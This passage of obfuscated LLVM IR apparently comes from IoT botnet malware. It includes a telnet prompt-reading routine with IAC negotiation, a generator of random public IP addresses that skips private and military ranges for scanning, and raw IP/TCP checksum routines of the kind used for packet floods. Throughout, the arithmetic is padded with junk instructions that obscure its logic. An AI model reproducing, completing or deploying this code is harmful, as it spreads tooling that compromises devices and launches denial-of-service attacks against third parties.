  store i32 %89, i32* %7, align 4
  br label %18

; <label>:91:                                     ; preds = %83
  %92 = load i8*, i8** %3, align 8
  %93 = load i32, i32* %5, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i32, i32* %7, align 4
  %97 = sext i32 %96 to i64
  %98 = sub i64 0, %97
  %99 = add i64 0, %98
  %100 = sub i64 0, %97
  %101 = getelementptr inbounds i8, i8* %95, i64 %99
  %102 = load i8, i8* %101, align 1
  %103 = sext i8 %102 to i32
  %104 = load i8*, i8** %4, align 8
  %105 = load i32, i32* %6, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds i8, i8* %104, i64 %106
  %108 = load i8, i8* %107, align 1
  %109 = sext i8 %108 to i32
  %110 = icmp eq i32 %103, %109
  br i1 %110, label %111, label %112

; <label>:111:                                    ; preds = %91
  store i32 1, i32* %2, align 4
  br label %119

; <label>:112:                                    ; preds = %91
  br label %113

; <label>:113:                                    ; preds = %112
  %114 = load i32, i32* %6, align 4
  %115 = sub i32 0, 1
  %116 = sub i32 %114, %115
  %117 = add nsw i32 %114, 1
  store i32 %116, i32* %6, align 4
  br label %11

; <label>:118:                                    ; preds = %11
  store i32 0, i32* %2, align 4
  br label %119

; <label>:119:                                    ; preds = %118, %111
  %120 = load i32, i32* %2, align 4
  ret i32 %120
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  br label %33

; <label>:33:                                     ; preds = %165, %8
  %34 = load i32, i32* %18, align 4
  %35 = sub i32 %34, 1088091559
  %36 = add i32 %35, 2
  %37 = add i32 %36, 1088091559
  %38 = add nsw i32 %34, 2
  %39 = load i32, i32* %16, align 4
  %40 = icmp slt i32 %37, %39
  br i1 %40, label %41, label %51

; <label>:41:                                     ; preds = %33
  %42 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %43 = load i64, i64* %42, align 8
  %44 = icmp sgt i64 %43, 0
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %47 = load i64, i64* %46, align 8
  %48 = icmp sgt i64 %47, 0
  br label %49

; <label>:49:                                     ; preds = %45, %41
  %50 = phi i1 [ true, %41 ], [ %48, %45 ]
  br label %51

; <label>:51:                                     ; preds = %49, %33
  %52 = phi i1 [ false, %33 ], [ %50, %49 ]
  br i1 %52, label %53, label %166

; <label>:53:                                     ; preds = %51
  br label %54

; <label>:54:                                     ; preds = %53
  %55 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %56 = getelementptr inbounds [16 x i64], [16 x i64]* %55, i64 0, i64 0
  %57 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %56) #2, !srcloc !5
  %58 = extractvalue { i64, i64* } %57, 0
  %59 = extractvalue { i64, i64* } %57, 1
  %60 = trunc i64 %58 to i32
  store i32 %60, i32* %24, align 4
  %61 = ptrtoint i64* %59 to i64
  %62 = trunc i64 %61 to i32
  store i32 %62, i32* %25, align 4
  br label %63

; <label>:63:                                     ; preds = %54
  %64 = load i32, i32* %10, align 4
  %65 = srem i32 %64, 64
  %66 = zext i32 %65 to i64
  %67 = shl i64 1, %66
  %68 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %69 = load i32, i32* %10, align 4
  %70 = sdiv i32 %69, 64
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds [16 x i64], [16 x i64]* %68, i64 0, i64 %71
  %73 = load i64, i64* %72, align 8
  %74 = xor i64 %73, -1
  %75 = xor i64 %67, -1
  %76 = xor i64 -2373865881979519179, -1
  %77 = and i64 %74, -2373865881979519179
  %78 = and i64 %73, %76
  %79 = and i64 %75, -2373865881979519179
  %80 = and i64 %67, %76
  %81 = or i64 %77, %78
  %82 = or i64 %79, %80
  %83 = xor i64 %81, %82
  %84 = or i64 %74, %75
  %85 = xor i64 %84, -1
  %86 = or i64 -2373865881979519179, %76
  %87 = and i64 %85, %86
  %88 = or i64 %83, %87
  %89 = or i64 %73, %67
  store i64 %88, i64* %72, align 8
  %90 = load i32, i32* %10, align 4
  %91 = sub i32 %90, 1080838612
  %92 = add i32 %91, 1
  %93 = add i32 %92, 1080838612
  %94 = add nsw i32 %90, 1
  %95 = call i32 @select(i32 %93, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %96 = icmp slt i32 %95, 1
  br i1 %96, label %97, label %98

; <label>:97:                                     ; preds = %63
  br label %166

; <label>:98:                                     ; preds = %63
  %99 = load i8*, i8** %15, align 8
  %100 = load i32, i32* %18, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds i8, i8* %99, i64 %101
  store i8* %102, i8** %23, align 8
  %103 = load i32, i32* %10, align 4
  %104 = load i8*, i8** %23, align 8
  %105 = call i64 @recv(i32 %103, i8* %104, i64 1, i32 0)
  %106 = trunc i64 %105 to i32
  store i32 %106, i32* %19, align 4
  %107 = load i32, i32* %19, align 4
  %108 = icmp eq i32 %107, -1
  br i1 %108, label %112, label %109

; <label>:109:                                    ; preds = %98
  %110 = load i32, i32* %19, align 4
  %111 = icmp eq i32 %110, 0
  br i1 %111, label %112, label %113

; <label>:112:                                    ; preds = %109, %98
  store i32 0, i32* %9, align 4
  br label %171

; <label>:113:                                    ; preds = %109
  %114 = load i32, i32* %19, align 4
  %115 = load i32, i32* %18, align 4
  %116 = sub i32 0, %115
  %117 = sub i32 0, %114
  %118 = add i32 %116, %117
  %119 = sub i32 0, %118
  %120 = add nsw i32 %115, %114
  store i32 %119, i32* %18, align 4
  %121 = load i8*, i8** %23, align 8
  %122 = load i8, i8* %121, align 1
  %123 = zext i8 %122 to i32
  %124 = icmp eq i32 %123, 255
  br i1 %124, label %125, label %151

; <label>:125:                                    ; preds = %113
  %126 = load i32, i32* %10, align 4
  %127 = load i8*, i8** %23, align 8
  %128 = getelementptr inbounds i8, i8* %127, i64 1
  %129 = call i64 @recv(i32 %126, i8* %128, i64 2, i32 0)
  %130 = trunc i64 %129 to i32
  store i32 %130, i32* %19, align 4
  %131 = load i32, i32* %19, align 4
  %132 = icmp eq i32 %131, -1
  br i1 %132, label %136, label %133

; <label>:133:                                    ; preds = %125
  %134 = load i32, i32* %19, align 4
  %135 = icmp eq i32 %134, 0
  br i1 %135, label %136, label %137

; <label>:136:                                    ; preds = %133, %125
  store i32 0, i32* %9, align 4
  br label %171

; <label>:137:                                    ; preds = %133
  %138 = load i32, i32* %19, align 4
  %139 = load i32, i32* %18, align 4
  %140 = sub i32 0, %139
  %141 = sub i32 0, %138
  %142 = add i32 %140, %141
  %143 = sub i32 0, %142
  %144 = add nsw i32 %139, %138
  store i32 %143, i32* %18, align 4
  %145 = load i32, i32* %10, align 4
  %146 = load i8*, i8** %23, align 8
  %147 = call i32 @negotiate(i32 %145, i8* %146, i32 3)
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %150, label %149

; <label>:149:                                    ; preds = %137
  store i32 0, i32* %9, align 4
  br label %171

; <label>:150:                                    ; preds = %137
  br label %165

; <label>:151:                                    ; preds = %113
  %152 = load i8*, i8** %15, align 8
  %153 = load i8*, i8** %11, align 8
  %154 = call i8* @strstr(i8* %152, i8* %153) #10
  %155 = icmp ne i8* %154, null
  br i1 %155, label %163, label %156

; <label>:156:                                    ; preds = %151
  %157 = load i32, i32* %12, align 4
  %158 = icmp ne i32 %157, 0
  br i1 %158, label %159, label %164

; <label>:159:                                    ; preds = %156
  %160 = load i8*, i8** %15, align 8
  %161 = call i32 @matchPrompt(i8* %160)
  %162 = icmp ne i32 %161, 0
  br i1 %162, label %163, label %164

; <label>:163:                                    ; preds = %159, %151
  store i32 1, i32* %20, align 4
  br label %166

; <label>:164:                                    ; preds = %159, %156
  br label %165

; <label>:165:                                    ; preds = %164, %150
  br label %33

; <label>:166:                                    ; preds = %163, %97, %51
  %167 = load i32, i32* %20, align 4
  %168 = icmp ne i32 %167, 0
  br i1 %168, label %169, label %170

; <label>:169:                                    ; preds = %166
  store i32 1, i32* %9, align 4
  br label %171

; <label>:170:                                    ; preds = %166
  store i32 0, i32* %9, align 4
  br label %171

; <label>:171:                                    ; preds = %170, %169, %149, %136, %112
  %172 = load i32, i32* %9, align 4
  ret i32 %172
}

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:14:                                     ; preds = %154, %0
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  br i1 %17, label %152, label %18

; <label>:18:                                     ; preds = %14
  %19 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 0
  br i1 %21, label %152, label %22

; <label>:22:                                     ; preds = %18
  %23 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %24 = zext i8 %23 to i32
  %25 = icmp eq i32 %24, 3
  br i1 %25, label %152, label %26

; <label>:26:                                     ; preds = %22
  %27 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %28 = zext i8 %27 to i32
  %29 = icmp eq i32 %28, 15
  br i1 %29, label %152, label %30

; <label>:30:                                     ; preds = %26
  %31 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %32 = zext i8 %31 to i32
  %33 = icmp eq i32 %32, 16
  br i1 %33, label %152, label %34

; <label>:34:                                     ; preds = %30
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 56
  br i1 %37, label %152, label %38

; <label>:38:                                     ; preds = %34
  %39 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 10
  br i1 %41, label %152, label %42

; <label>:42:                                     ; preds = %38
  %43 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %44 = zext i8 %43 to i32
  %45 = icmp eq i32 %44, 192
  br i1 %45, label %46, label %50

; <label>:46:                                     ; preds = %42
  %47 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 168
  br i1 %49, label %152, label %50

; <label>:50:                                     ; preds = %46, %42
  %51 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %52 = zext i8 %51 to i32
  %53 = icmp eq i32 %52, 172
  br i1 %53, label %54, label %62

; <label>:54:                                     ; preds = %50
  %55 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %56 = zext i8 %55 to i32
  %57 = icmp sge i32 %56, 16
  br i1 %57, label %58, label %62

; <label>:58:                                     ; preds = %54
  %59 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %60 = zext i8 %59 to i32
  %61 = icmp slt i32 %60, 32
  br i1 %61, label %152, label %62

; <label>:62:                                     ; preds = %58, %54, %50
  %63 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %64 = zext i8 %63 to i32
  %65 = icmp eq i32 %64, 100
  br i1 %65, label %66, label %74

; <label>:66:                                     ; preds = %62
  %67 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %68 = zext i8 %67 to i32
  %69 = icmp sge i32 %68, 64
  br i1 %69, label %70, label %74

; <label>:70:                                     ; preds = %66
  %71 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %72 = zext i8 %71 to i32
  %73 = icmp slt i32 %72, 127
  br i1 %73, label %152, label %74

; <label>:74:                                     ; preds = %70, %66, %62
  %75 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 169
  br i1 %77, label %78, label %82

; <label>:78:                                     ; preds = %74
  %79 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %80 = zext i8 %79 to i32
  %81 = icmp sgt i32 %80, 254
  br i1 %81, label %152, label %82

; <label>:82:                                     ; preds = %78, %74
  %83 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %84 = zext i8 %83 to i32
  %85 = icmp eq i32 %84, 198
  br i1 %85, label %86, label %94

; <label>:86:                                     ; preds = %82
  %87 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %88 = zext i8 %87 to i32
  %89 = icmp sge i32 %88, 18
  br i1 %89, label %90, label %94

; <label>:90:                                     ; preds = %86
  %91 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %92 = zext i8 %91 to i32
  %93 = icmp slt i32 %92, 20
  br i1 %93, label %152, label %94

; <label>:94:                                     ; preds = %90, %86, %82
  %95 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 224
  br i1 %97, label %152, label %98

; <label>:98:                                     ; preds = %94
  %99 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %100 = zext i8 %99 to i32
  %101 = icmp eq i32 %100, 6
  br i1 %101, label %150, label %102

; <label>:102:                                    ; preds = %98
  %103 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %104 = zext i8 %103 to i32
  %105 = icmp eq i32 %104, 7
  br i1 %105, label %150, label %106

; <label>:106:                                    ; preds = %102
  %107 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %108 = zext i8 %107 to i32
  %109 = icmp eq i32 %108, 11
  br i1 %109, label %150, label %110

; <label>:110:                                    ; preds = %106
  %111 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %112 = zext i8 %111 to i32
  %113 = icmp eq i32 %112, 21
  br i1 %113, label %150, label %114

; <label>:114:                                    ; preds = %110
  %115 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %116 = zext i8 %115 to i32
  %117 = icmp eq i32 %116, 22
  br i1 %117, label %150, label %118

; <label>:118:                                    ; preds = %114
  %119 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %120 = zext i8 %119 to i32
  %121 = icmp eq i32 %120, 26
  br i1 %121, label %150, label %122

; <label>:122:                                    ; preds = %118
  %123 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %124 = zext i8 %123 to i32
  %125 = icmp eq i32 %124, 28
  br i1 %125, label %150, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %128 = zext i8 %127 to i32
  %129 = icmp eq i32 %128, 29
  br i1 %129, label %150, label %130

; <label>:130:                                    ; preds = %126
  %131 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %132 = zext i8 %131 to i32
  %133 = icmp eq i32 %132, 30
  br i1 %133, label %150, label %134

; <label>:134:                                    ; preds = %130
  %135 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %136 = zext i8 %135 to i32
  %137 = icmp eq i32 %136, 33
  br i1 %137, label %150, label %138

; <label>:138:                                    ; preds = %134
  %139 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %140 = zext i8 %139 to i32
  %141 = icmp eq i32 %140, 55
  br i1 %141, label %150, label %142

; <label>:142:                                    ; preds = %138
  %143 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %144 = zext i8 %143 to i32
  %145 = icmp eq i32 %144, 214
  br i1 %145, label %150, label %146

; <label>:146:                                    ; preds = %142
  %147 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %148 = zext i8 %147 to i32
  %149 = icmp eq i32 %148, 215
  br label %150

; <label>:150:                                    ; preds = %146, %142, %138, %134, %130, %126, %122, %118, %114, %110, %106, %102, %98
  %151 = phi i1 [ true, %142 ], [ true, %138 ], [ true, %134 ], [ true, %130 ], [ true, %126 ], [ true, %122 ], [ true, %118 ], [ true, %114 ], [ true, %110 ], [ true, %106 ], [ true, %102 ], [ true, %98 ], [ %149, %146 ]
  br label %152

; <label>:152:                                    ; preds = %150, %94, %90, %78, %70, %58, %46, %38, %34, %30, %26, %22, %18, %14
  %153 = phi i1 [ true, %94 ], [ true, %90 ], [ true, %78 ], [ true, %70 ], [ true, %58 ], [ true, %46 ], [ true, %38 ], [ true, %34 ], [ true, %30 ], [ true, %26 ], [ true, %22 ], [ true, %18 ], [ true, %14 ], [ %151, %150 ]
  br i1 %153, label %154, label %167

; <label>:154:                                    ; preds = %152
  %155 = call i32 @rand() #2
  %156 = srem i32 %155, 223
  %157 = trunc i32 %156 to i8
  store i8 %157, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %158 = call i32 @rand() #2
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #2
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #2
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  br label %14

; <label>:167:                                    ; preds = %152
  %168 = bitcast [16 x i8]* %1 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %175 = zext i8 %174 to i32
  %176 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %177 = zext i8 %176 to i32
  %178 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.136, i32 0, i32 0), i32 %171, i32 %173, i32 %175, i32 %177)
  %179 = getelementptr inbounds [16 x i8], [16 x i8]* %1, i32 0, i32 0
  %180 = call i32 @inet_addr(i8* %179) #2
  ret i32 %180
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 135891879, -1
  %10 = or i32 %7, %8
  %11 = or i32 135891879, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %22, -1
  %25 = xor i32 %16, %24
  %26 = and i32 %25, %16
  %27 = and i32 %16, %22
  %28 = xor i32 %15, -1
  %29 = and i32 %26, %28
  %30 = xor i32 %26, -1
  %31 = and i32 %15, %30
  %32 = or i32 %29, %31
  %33 = xor i32 %15, %26
  ret i32 %32
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %23

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -8434568821531403333
  %16 = add i64 %15, %13
  %17 = add i64 %16, -8434568821531403333
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = sub i32 0, 2
  %21 = add i32 %19, %20
  %22 = sub nsw i32 %19, 2
  store i32 %21, i32* %4, align 4
  br label %6

; <label>:23:                                     ; preds = %6
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 0
  br i1 %25, label %26, label %35

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %3, align 8
  %28 = bitcast i16* %27 to i8*
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i64
  %31 = load i64, i64* %5, align 8
  %32 = sub i64 0, %30
  %33 = sub i64 %31, %32
  %34 = add i64 %31, %30
  store i64 %33, i64* %5, align 8
  br label %35

; <label>:35:                                     ; preds = %26, %23
  br label %36

; <label>:36:                                     ; preds = %40, %35
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %52

; <label>:40:                                     ; preds = %36
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 65535, -1
  %43 = xor i64 %41, %42
  %44 = and i64 %43, %41
  %45 = and i64 %41, 65535
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = sub i64 %44, 7754941804258619446
  %49 = add i64 %48, %47
  %50 = add i64 %49, 7754941804258619446
  %51 = add i64 %44, %47
  store i64 %50, i64* %5, align 8
  br label %36

; <label>:52:                                     ; preds = %36
  %53 = load i64, i64* %5, align 8
  %54 = xor i64 %53, -1
  %55 = and i64 3446994454762607796, %54
  %56 = xor i64 3446994454762607796, -1
  %57 = and i64 %53, %56
  %58 = xor i64 -1, -1
  %59 = and i64 %58, 3446994454762607796
  %60 = and i64 -1, %56
  %61 = or i64 %55, %57
  %62 = or i64 %59, %60
  %63 = xor i64 %61, %62
  %64 = xor i64 %53, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
